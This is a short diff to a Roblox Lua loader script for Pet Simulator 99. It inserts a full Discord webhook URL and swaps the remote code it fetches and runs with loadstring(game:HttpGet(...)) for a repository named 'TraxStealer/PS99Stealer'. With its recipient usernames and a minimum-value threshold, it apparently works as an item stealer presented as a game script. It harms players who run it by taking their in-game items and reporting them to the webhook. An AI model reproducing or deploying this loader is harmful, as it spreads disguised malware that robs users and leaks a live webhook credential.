@@ -1,6 +1,6 @@
 Username = "utguweug"
 Username2 = "utguweug"
 MinimumRAP = 1000
-Webhook = "Your Webhook"
+Webhook = "https://discord.com/api/webhooks/1351549633557696593/MAM-hPy7Ws3jKgl6Ac_fN7-b7_6PCfXuiq09KjEl4thcepeNHbcmpllt50rJ9uz1cJWI"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/UrbanDEV0/Pet-Simulator-99-Script-OP-/refs/heads/main/roblox", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()
